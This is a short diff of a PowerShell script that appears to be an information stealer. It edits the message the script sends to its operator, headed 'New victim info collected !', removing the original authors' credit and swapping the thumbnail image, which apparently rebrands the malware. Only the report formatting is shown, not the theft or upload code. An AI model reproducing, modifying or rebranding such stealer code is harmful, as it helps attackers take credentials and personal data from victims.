@@ -672,10 +672,10 @@ function Backup-Data {
                 "description" = "New victim info collected !"
                 "color" = "3447003"
                 "footer" = @{
-                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
+                    "text" = "Have fun!"
                 }
                 "thumbnail" = @{
-                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+                    "url" = "https://media.tenor.com/2jU2Y8X8-WkAAAAe/colon-three-kitty.png"
                 }
                 "fields" = @(
                     @{
